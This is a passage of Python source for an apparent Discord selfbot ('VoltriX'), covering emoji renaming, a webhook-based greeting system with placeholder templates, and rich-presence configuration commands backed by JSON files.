            if new_name.lower() != emoji.name.lower() and new_name.lower() in existing_names:
                failed += 1
                failed_list.append(f"{emoji.name} -> {new_name} (already exists)")
                continue

            try:
                await emoji.edit(name=new_name)
                existing_names.discard(emoji.name.lower())
                existing_names.add(new_name.lower())
                removed += 1
                await asyncio.sleep(0.7)
            except Exception as e:
                failed += 1
                failed_list.append(f"{emoji.name} ({e})")

        msg = (
            f"✅ **Renamed:** `{removed}`\n"
            f"⏭ **Not matching prefix:** `{skipped}`\n"
            f"❌ **Failed:** `{failed}`"
        )
        if failed_list:
            msg += "\n🚫 **Failures:**\n" + "\n".join(failed_list[:5])
        await send(ctx, "Remove Prefix", msg)


class Greet(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def to_ordinal(self,n):
        n = int(n)
        if 10 <= n % 100 <= 20:
            suffix = 'th'
        else:
            suffix = {1: 'st', 2: 'nd', 3: 'rd'}.get(n % 10, 'th')
        return f"{n}{suffix}"
    
    @commands.Cog.listener()
    async def on_member_join(self, member):
        try:
            with open("database/greets.json", "r") as f:
                data = json.load(f)

            if str(member.guild.id) not in data:
                return

            guild_data = data[str(member.guild.id)]

            placeholders = {
                "{username}": member.name,
                "{mention}": member.mention,
                "{servername}": member.guild.name,
                "{time}": time(),
                "{date}": date(),
                "{membercount}": str(member.guild.member_count),
                "{usercount}": str(len([m for m in member.guild.members if not m.bot])),
                "{userplace}": self.to_ordinal(member.guild.member_count),
                "{usercreated}": member.created_at.strftime("%Y-%m-%d %H:%M:%S"),
                "{servericon}": member.guild.icon.url if member.guild.icon else "",
                "{useravatar}": str(member.display_avatar.url)
            }

            def format_field(value):
                if not isinstance(value, str):
                    return ""
                for k, v in placeholders.items():
                    value = value.replace(k, v)
                return value

            greeting_message = format_field(guild_data.get("greeting_message", ""))
            embed_status = guild_data.get("embed_status", False)
            embed_title = format_field(guild_data.get("embed_title", ""))
            embed_footer = format_field(guild_data.get("embed_footer", ""))
            embed_color = int(guild_data.get("embed_color", "#ffffff").lstrip("#"), 16)
            embed_image = format_field(guild_data.get("embed_image", ""))
            embed_thumbnail = format_field(guild_data.get("embed_thumbnail", ""))
            webhook_name = format_field(guild_data.get("webhook_name", member.guild.name))
            webhook_avatar = format_field(guild_data.get("webhook_avatar", ""))
            user_mention = guild_data.get("user_mention", True)

            for channel_id in guild_data.get("channel_ids", []):
                channel = self.bot.get_channel(int(channel_id))
                if not channel:
                    continue

                webhook = await channel.create_webhook(name=webhook_name)
                try:
                    if embed_status:
                        embed = discord.Embed(title=embed_title, description=greeting_message, color=embed_color)
                        if embed_footer:
                            embed.set_footer(text=embed_footer)
                        if embed_image:
                            embed.set_image(url=embed_image)
                        if embed_thumbnail:
                            embed.set_thumbnail(url=embed_thumbnail)
                        if user_mention == True:
                            await webhook.send(member.mention,embed=embed, username=webhook_name, avatar_url=webhook_avatar or None)
                        else:
                            await webhook.send(embed=embed, username=webhook_name, avatar_url=webhook_avatar or None)

                    else:
                        await webhook.send(content=greeting_message, username=webhook_name, avatar_url=webhook_avatar or None)
                finally:
                    await webhook.delete()

        except Exception as e:
            print(f"[ERROR] on_member_join failed: {e}")

                            
    @commands.command(aliases=["setgreet","setgmsg"])
    async def setgreetmsg(self,ctx):
        await ctx.message.delete()
        ask_msg = await send(
            ctx,
            "Greet Message",
            "Please send the greeting message you want to set. You can use the following placeholders:\n\n>>> ```"
            "{username} - User's username\n"
            "{mention} - User mention\n"
            "{servername} - Server name\n"
            "{time} - current time\n"
            "{date} - current date\n"
            "{membercount} - Total members\n"
            "{usercount} - Total users count (non-bot)\n"
            "{userplace} - User position (like: 4th , 5th)\n"
            "{usercreated} - Acc created date\n"
            "{servericon} - Server icon (url)\n"
            "{useravatar} - User avatar (url)\n```"
            "```\n\nExample: ```Welcome {username} to {servername}! You are the {userplace} member to join!```"
        )

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await self.bot.wait_for('message', check=check, timeout=300)
            greeting_message = msg.content
            with open("database/greets.json", "r") as f:
                data = json.load(f)
                if str(ctx.guild.id) not in data:
                    data[str(ctx.guild.id)] = {
                        "greeting_message": "",
                        "channel_ids": [],
                        "embed_status": True,
                        "embed_color": "#FF0000",
                        "embed_title": "Welcome to {servername}",
                        "embed_footer": "Joined : {time} : {date}",
                        "embed_image": "",
                        "embed_thumbnail": "",
                        "webhook_name": "{servername}",
                        "webhook_avatar": "{servericon}"
                    }
                else:
                    data[str(ctx.guild.id)]["greeting_message"] = greeting_message
                with open("database/greets.json", "w") as f:
                    json.dump(data, f, indent=4)
            await msg.delete()
            await ask_msg.delete()
            await  send(ctx,"Success","Greeting message set successfully!")
        except Exception as e:
            await senderror(ctx,"Error",e)
            
    @commands.command(aliases=["setgreetchannel","addgchannel","addgch"])
    async def addgreetchannel(self,ctx,channel:discord.TextChannel=None):
        await ctx.message.delete()
        channel = channel or ctx.channel
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            if str(ctx.guild.id) not in data:
                data[str(ctx.guild.id)] = {
                    "greeting_message": "",
                    "channel_ids": [str(channel.id)],
                    "embed_status": True,
                    "embed_color": "#FF0000",
                    "embed_title": "Welcome to {servername}",
                    "embed_footer": "Joined : {time} : {date}",
                    "embed_image": "",
                    "embed_thumbnail": "",
                    "webhook_name": "{servername}",
                    "webhook_avatar": "{servericon}"
                }
            else:
                if str(channel.id) not in data[str(ctx.guild.id)]["channel_ids"]:
                    data[str(ctx.guild.id)]["channel_ids"].append(channel.id)
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
        await send(ctx,"Success","Greeting channel added successfully!")

    @commands.command(aliases=["delgreetchannel","delgch",'remgch'])
    async def removegreetchannel(self,ctx,channel:discord.TextChannel=None):
        await ctx.message.delete()
        channel = channel or ctx.channel
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            if str(ctx.guild.id) not in data:
                return await send(ctx,"Error","No greeting channels found.")
            else:
                if str(channel.id) in data[str(ctx.guild.id)]["channel_ids"]:
                    data[str(ctx.guild.id)]["channel_ids"].remove(channel.id)
                    with open("database/greets.json", "w") as f:
                        json.dump(data, f, indent=4)
                    await send(ctx,"Success","Greeting channel removed successfully!")
                else:
                    await send(ctx,"Error","This channel is not a greeting channel.")

    @commands.command(aliases=["gembed","greetembed"])
    async def greetembedstatus(self,ctx,status:bool=None):
        await ctx.message.delete()
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            if status is None:
                return await send(ctx,"Error","Please specify a status (True/False).")
            data[str(ctx.guild.id)]["embed_status"] = status
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed status updated to `{status}` successfully!")                
    
    @commands.command(aliases=["gtitle","greettitle"])
    async def greetembedtitle(self,ctx,*title):
        await ctx.message.delete()
        title = " ".join(title)
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["embed_title"] = title
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed title updated to `{title}` successfully!")

    @commands.command(aliases=["gfooter","greetfooter"])
    async def greetembedfooter(self,ctx,*footer):
        await ctx.message.delete()
        footer = " ".join(footer)
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["embed_footer"] = footer
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed footer updated to `{footer}` successfully!")

    @commands.command(aliases=["gcolor","gcolour","greetcolor","greetcolour"])
    async def greetembedcolor(self,ctx,color): 
        await ctx.message.delete()
        if color is None:
            return await send(ctx,"Error","Please specify a color in hex format (e.g. #FF0000).")
        if not color.startswith("#") or len(color) != 7:
            return await send(ctx,"Error","Please specify a valid hex color code (e.g. #FF0000).")
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["embed_color"] = color
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed color updated to `{color}` successfully!")     
        
    @commands.command(aliases=["greetimage"])
    async def greetembedimage(self,ctx,url_or_placeholder):
        await ctx.message.delete()
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["embed_image"] = url_or_placeholder
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed image updated to `{url_or_placeholder}` successfully!")

    @commands.command(aliases=["gthumbnail","greetthumbnail"])
    async def greetembedthumbnail(self,ctx,url_or_placeholder):
        await ctx.message.delete()
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["embed_thumbnail"] = url_or_placeholder
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed thumbnail updated to `{url_or_placeholder}` successfully!")

    @commands.command(aliases=["gwname","gwhookname","gwebname"])
    async def greetwebhookname(self,ctx,*name):
        await ctx.message.delete()
        name = " ".join(name)
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["webhook_name"] = name
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting webhook name updated to `{name}` successfully!")

    @commands.command(aliases=["gwavatar","gwhookavatar","gwava","gwhookava",'gwebavatar'])
    async def greetwebhookavatar(self,ctx,url_or_placeholder):
        await ctx.message.delete()
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["webhook_avatar"] = url_or_placeholder
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting webhook avatar updated to `{url_or_placeholder}` successfully!")

    @commands.command(aliases=['gtest','testg','testgreet'])
    async def greettest(self,ctx):
        with open("database/greets.json", "r") as f:
            data = json.load(f)
        guild_id = str(ctx.guild.id)
        if guild_id not in data:
            return await ctx.send("❌ Greet system is not set up for this server.")
        guild_data = data[guild_id]
        channel_ids = guild_data.get("channel_ids", [])
        if not channel_ids:
            return await ctx.send("⚠️ No greet channels are set in the configuration.")        
        await self.on_member_join(ctx.author)
        await ctx.message.add_reaction("✅")
        await ctx.message.delete(delay=30)

    @commands.command(aliases=['umention','gusermention'])
    async def usermention(self,ctx,status:bool=None):
        await ctx.message.delete()
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            if status is None:
                return await send(ctx,"Error","Please specify a status (True/False).")
            data[str(ctx.guild.id)]["user_mention"] = status
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Embed user mention status updated to `{status}` successfully!")                
    

    @commands.command()
    async def greet(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Set greeting message** **:** **`{prefix}setgreetmsg`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Add greeting channel** **:** **`{prefix}addgch [channel]`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Remove greeting channel** **:** **`{prefix}remgch [channel]`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Sreet embed status** **:** **`{prefix}gembed [true|false]`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Set embed title** **:** **`{prefix}gtitle [text]`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Set embed footer** **:** **`{prefix}gfooter [text]`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Set embed color** **:** **`{prefix}gcolor [hex colour]`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Set embed image** **:** **`{prefix}greetimage [URL]`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Set embed thumbnail** **:** **`{prefix}gthumbnail [URL]`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Set webhook name** **:** **`{prefix}gwebname [name]`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Set webhook avatar** **:** **`{prefix}gwebavatar [URL]`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Test greeting system** **:** **`{prefix}greettest`**\n"
            f"<a:FF_aes_blueflower:1281973616606449717> | **Embed user mention** **:** **`{prefix}umention [true|false]`**\n"
            f"- <a:FF_aes_blueflower:1281973616606449717> **Some Placeholders** <a:FF_aes_blueflower:1281973616606449717>\n"
            "```{username} - User's username\n"
            "{mention} - User mention\n"
            "{servername} - Server name\n"
            "{time} - current time\n"
            "{date} - current date\n"
            "{membercount} - Total members\n"
            "{usercount} - Total users\n"
            "{userplace} - User position\n"
            "{usercreated} - Acc created date\n"
            "{servericon} - Server icon (url)\n"
            "{useravatar} - User avatar (url)```\n"            
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Greeting Commands__<:Titanz:1281243489635405827>", description)


ALIAS_FILE = "database/aliases.json"

def load_aliases():
    if os.path.exists(ALIAS_FILE):
        with open(ALIAS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_aliases(data):
    with open(ALIAS_FILE, "w") as f:
        json.dump(data, f, indent=4)

class rpc(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.ensure_config()

    def ensure_config(self):
        if not os.path.exists("config/rpc_config.json"):
            config = {
                "enabled": False,
                "type": "playing",
                "name": "VoltriX Selfbot",
                "state": "Exploring main.py",
                "details": "Level 99 Coder",
                "url": "https://twitch.tv/voltrix",
                "application_id": None,
                "large_image": "",
                "large_text": "",
                "small_image": "",
                "small_text": "",
                "start_timestamp": None,
                "end_timestamp": None,
                "party": {"enabled": False, "current": 1, "max": 5},
                "buttons": [{"label": "", "url": ""}, {"label": "", "url": ""}]
            }
            with open("config/rpc_config.json", "w") as f:
                json.dump(config, f, indent=4)

    def parse_timestamp(self, value, is_end=False):
        if not value:
            return None
        from datetime import datetime, timezone, timedelta
        if isinstance(value, (int, float)):
            try:
                return datetime.fromtimestamp(value, tz=timezone.utc)
            except Exception:
                return None
        if isinstance(value, str):
            value = value.strip()
            if value.lower() == "none":
                return None
            if value.isdigit():
                try:
                    return datetime.fromtimestamp(float(value), tz=timezone.utc)
                except Exception:
                    return None
            if ":" in value:
                parts = value.split(':')
                if len(parts) in (2, 3):
                    try:
                        if len(parts) == 2:
                            minutes = int(parts[0])
                            seconds = int(parts[1])
                            delta = minutes * 60 + seconds
                        else:
                            hours = int(parts[0])
                            minutes = int(parts[1])
                            seconds = int(parts[2])
                            delta = hours * 3600 + minutes * 60 + seconds
                        
                        now = datetime.now(timezone.utc)
                        return now + timedelta(seconds=delta) if is_end else now - timedelta(seconds=delta)
                    except ValueError:
                        pass
        return None

    async def update_rpc(self):
        try:
            with open("config/rpc_config.json", "r") as f:
                config = json.load(f)
        except Exception:
            return

        if not config.get("enabled", False):
            await self.bot.change_presence(activity=None)
            return

        from discord.activity import ActivityAssets, ActivityParty, ActivityTimestamps
        from discord import ActivityButton, ActivityType, Activity
        from datetime import datetime, timezone

        activity_type_map = {
            "playing": ActivityType.playing,
            "streaming": ActivityType.streaming,
            "listening": ActivityType.listening,
            "watching": ActivityType.watching,
            "competing": ActivityType.competing,
        }
        
        act_type_str = str(config.get("type", "playing")).lower().strip()
        act_type = activity_type_map.get(act_type_str, ActivityType.playing)

        kwargs = {
            "name": config.get("name", "Custom Status"),
            "type": act_type
        }

        if config.get("application_id"):
            try:
                kwargs["application_id"] = int(config["application_id"])
            except ValueError:
                pass

        if act_type == ActivityType.streaming:
            kwargs["url"] = config.get("url") or "https://twitch.tv/voltrix"

        if config.get("state"):
            kwargs["state"] = config["state"]
        if config.get("details"):
            kwargs["details"] = config["details"]

        # Parse timestamps
        start_val = config.get("start_timestamp")
        end_val = config.get("end_timestamp")
        timestamps_kwargs = {}
        
        parsed_start = self.parse_timestamp(start_val, is_end=False)
        if parsed_start is not None:
            timestamps_kwargs["start"] = parsed_start
        else:
            timestamps_kwargs["start"] = datetime.now(timezone.utc)

        parsed_end = self.parse_timestamp(end_val, is_end=True)
        if parsed_end is not None:
            timestamps_kwargs["end"] = parsed_end

        kwargs["timestamps"] = ActivityTimestamps(**timestamps_kwargs)

        assets_kwargs = {}
        if config.get("large_image"):
            assets_kwargs["large_image"] = config["large_image"]
        if config.get("large_text"):
            assets_kwargs["large_text"] = config["large_text"]
        if config.get("small_image"):
            assets_kwargs["small_image"] = config["small_image"]
        if config.get("small_text"):
            assets_kwargs["small_text"] = config["small_text"]
        if assets_kwargs:
            kwargs["assets"] = ActivityAssets(**assets_kwargs)

        party_config = config.get("party", {})
        if party_config.get("enabled", False):
            party_kwargs = {}
            party_kwargs["id"] = "voltrix-party"
            try:
                party_kwargs["current_size"] = int(party_config.get("current", 1))
                party_kwargs["max_size"] = int(party_config.get("max", 5))
                kwargs["party"] = ActivityParty(**party_kwargs)
            except ValueError:
                pass

        buttons_list = config.get("buttons", [])
        if buttons_list:
            buttons = []
            for btn in buttons_list[:2]:
                if btn.get("label") and btn.get("url"):
                    buttons.append(ActivityButton(label=btn["label"], url=btn["url"]))
            if buttons:
                kwargs["buttons"] = buttons

        try:
            activity = Activity(**kwargs)
            await self.bot.change_presence(activity=activity)
        except Exception as e:
            print(f"Error changing presence: {e}")

    async def prompt_field(self, ctx, config_key, prompt_text, sub_key=None):
        try:
            await ctx.message.delete()
        except:
            pass

        prompt_msg = await send(ctx, "RPC Config", f"✏️ {prompt_text}")

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await self.bot.wait_for("message", check=check, timeout=60.0)
            val = msg.content.strip()
            
            try:
                await msg.delete()
            except:
                pass
            try:
                await prompt_msg.delete()
            except:
                pass

            # Convert 'none' string to Python None
            if val.lower() == "none":
                val = None

            with open("config/rpc_config.json", "r") as f:
                config = json.load(f)

            if sub_key:
                config[config_key][sub_key] = val
            else:
                config[config_key] = val

            with open("config/rpc_config.json", "w") as f:
                json.dump(config, f, indent=4)

            await self.update_rpc()
            
            field_name = sub_key if sub_key else config_key
            display_val = "None" if val is None else f"`{val}`"
            await send(ctx, "RPC Updated", f"✅ RPC **{field_name}** has been updated to: {display_val}", delete_after=5)

        except asyncio.TimeoutError:
            try:
                await prompt_msg.delete()
            except:
                pass
            await send(ctx, "RPC Timeout", "❌ Configuration timed out (no response within 60s).", delete_after=5)

    @commands.Cog.listener()
    async def on_ready(self):
        await self.update_rpc()

    @commands.group(name="rpc", invoke_without_command=True)
    async def rpc_group(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")

        help_text = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Enable RPC** **:** **`{prefix}rpc enable`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Disable RPC** **:** **`{prefix}rpc disable`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Set RPC Type** **:** **`{prefix}rpc type`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Set RPC Name** **:** **`{prefix}rpc name`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Set RPC Details** **:** **`{prefix}rpc details`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Set RPC State** **:** **`{prefix}rpc state`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Set Start Time** **:** **`{prefix}rpc start`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Set End Time** **:** **`{prefix}rpc end`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Large Image Key** **:** **`{prefix}rpc large_image`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Large Image Hover** **:** **`{prefix}rpc large_text`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Small Image Key** **:** **`{prefix}rpc small_image`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Small Image Hover** **:** **`{prefix}rpc small_text`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Button 1 Label** **:** **`{prefix}rpc button1_name`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Button 1 URL** **:** **`{prefix}rpc button1_url`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Button 2 Label** **:** **`{prefix}rpc button2_name`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Button 2 URL** **:** **`{prefix}rpc button2_url`**\n"
            f"<a:Xieron_stolen_emoji_1787131712:1539566733046718495> | **Party Settings** **:** **`{prefix}rpc party [option]`**\n"
            f"Note: Configure directly from `rpc_config.json` for ease.\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Rich Presence (RPC) Cmds__<:Titanz:1281243489635405827>", help_text)

    @rpc_group.command(name="enable")
    async def rpc_enable(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass
        with open("config/rpc_config.json", "r") as f:
            config = json.load(f)
        config["enabled"] = True
        with open("config/rpc_config.json", "w") as f:
            json.dump(config, f, indent=4)
        await self.update_rpc()
        await send(ctx, "RPC Status", "✅ Rich Presence has been **enabled**!", delete_after=5)

    @rpc_group.command(name="disable")
    async def rpc_disable(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass
        with open("config/rpc_config.json", "r") as f:
            config = json.load(f)
        config["enabled"] = False
        with open("config/rpc_config.json", "w") as f:
            json.dump(config, f, indent=4)
        await self.update_rpc()
        await send(ctx, "RPC Status", "❌ Rich Presence has been **disabled**!", delete_after=5)

    @rpc_group.command(name="type")
    async def rpc_type(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass

        prompt_msg = await send(ctx, "RPC Config", "✏️ Enter the type (streaming/playing/watching/listening/competing):")

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await self.bot.wait_for("message", check=check, timeout=60.0)
            val = msg.content.strip().lower()
            
            try:
                await msg.delete()
            except:
                pass
            try:
                await prompt_msg.delete()
            except:
                pass

            valid_types = ["playing", "streaming", "listening", "watching", "competing"]
            if val not in valid_types:
                return await send(ctx, "RPC Error", f"❌ Invalid type: `{val}`. Must be one of: {', '.join(valid_types)}", delete_after=5)

            with open("config/rpc_config.json", "r") as f:
                config = json.load(f)

            config["type"] = val

            with open("config/rpc_config.json", "w") as f:
                json.dump(config, f, indent=4)

            await self.update_rpc()
            await send(ctx, "RPC Updated", f"✅ RPC **type** has been updated to: `{val}`", delete_after=5)

        except asyncio.TimeoutError:
            try:
                await prompt_msg.delete()
            except:
                pass
            await send(ctx, "RPC Timeout", "❌ Configuration timed out (no response within 60s).", delete_after=5)

    @rpc_group.command(name="name")
    async def rpc_name(self, ctx):
        await self.prompt_field(ctx, "name", "Enter the RPC name:")

    @rpc_group.command(name="details")
    async def rpc_details(self, ctx):
        await self.prompt_field(ctx, "details", "Enter the RPC details (Line 2):")

    @rpc_group.command(name="state")
    async def rpc_state(self, ctx):
        await self.prompt_field(ctx, "state", "Enter the RPC state (Line 3):")

    @rpc_group.command(name="start")
    async def rpc_start(self, ctx):
        await self.prompt_field(ctx, "start_timestamp", "Enter start timestamp (Unix timestamp or relative duration like '5:00', or 'none' to clear):")

    @rpc_group.command(name="end")
    async def rpc_end(self, ctx):
        await self.prompt_field(ctx, "end_timestamp", "Enter end timestamp (Unix timestamp or relative duration like '10:00', or 'none' to clear):")

    @rpc_group.command(name="large_image")
    async def rpc_large_image(self, ctx):
        await self.prompt_field(ctx, "large_image", "Enter the large image key or URL:")

    @rpc_group.command(name="large_text")
    async def rpc_large_text(self, ctx):
        await self.prompt_field(ctx, "large_text", "Enter the large image hover text:")

    @rpc_group.command(name="small_image")
    async def rpc_small_image(self, ctx):
        await self.prompt_field(ctx, "small_image", "Enter the small image key or URL:")

    @rpc_group.command(name="small_text")
    async def rpc_small_text(self, ctx):
        await self.prompt_field(ctx, "small_text", "Enter the small image hover text:")

    @rpc_group.command(name="button1_name")
    async def rpc_button1_name(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass

        prompt_msg = await send(ctx, "RPC Config", "✏️ Enter Button 1 label:")
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await self.bot.wait_for("message", check=check, timeout=60.0)
            val = msg.content.strip()
            try:
                await msg.delete()
            except:
                pass
            try:
                await prompt_msg.delete()
            except:
                pass

            with open("config/rpc_config.json", "r") as f:
                config = json.load(f)

            config["buttons"][0]["label"] = val

            with open("config/rpc_config.json", "w") as f:
                json.dump(config, f, indent=4)

            await self.update_rpc()
            await send(ctx, "RPC Updated", f"✅ RPC **Button 1 label** has been updated to: `{val}`", delete_after=5)

        except asyncio.TimeoutError:
            try:
                await prompt_msg.delete()
            except:
                pass
            await send(ctx, "RPC Timeout", "❌ Configuration timed out.", delete_after=5)

    @rpc_group.command(name="button1_url")
    async def rpc_button1_url(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass

        prompt_msg = await send(ctx, "RPC Config", "✏️ Enter Button 1 URL:")
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await self.bot.wait_for("message", check=check, timeout=60.0)
            val = msg.content.strip()
            try:
                await msg.delete()
            except:
                pass
            try:
                await prompt_msg.delete()
            except:
                pass

            with open("config/rpc_config.json", "r") as f:
                config = json.load(f)

            config["buttons"][0]["url"] = val

            with open("config/rpc_config.json", "w") as f:
                json.dump(config, f, indent=4)

            await self.update_rpc()
            await send(ctx, "RPC Updated", f"✅ RPC **Button 1 URL** has been updated to: `{val}`", delete_after=5)

        except asyncio.TimeoutError:
            try:
                await prompt_msg.delete()
            except:
                pass
            await send(ctx, "RPC Timeout", "❌ Configuration timed out.", delete_after=5)

    @rpc_group.command(name="button2_name")
    async def rpc_button2_name(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass

        prompt_msg = await send(ctx, "RPC Config", "✏️ Enter Button 2 label:")
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await self.bot.wait_for("message", check=check, timeout=60.0)
            val = msg.content.strip()
            try:
                await msg.delete()
            except:
                pass
            try:
                await prompt_msg.delete()
            except:
                pass

            with open("config/rpc_config.json", "r") as f:
                config = json.load(f)

            config["buttons"][1]["label"] = val

            with open("config/rpc_config.json", "w") as f:
                json.dump(config, f, indent=4)

            await self.update_rpc()
            await send(ctx, "RPC Updated", f"✅ RPC **Button 2 label** has been updated to: `{val}`", delete_after=5)

        except asyncio.TimeoutError:
            try:
                await prompt_msg.delete()
            except:
                pass
            await send(ctx, "RPC Timeout", "❌ Configuration timed out.", delete_after=5)

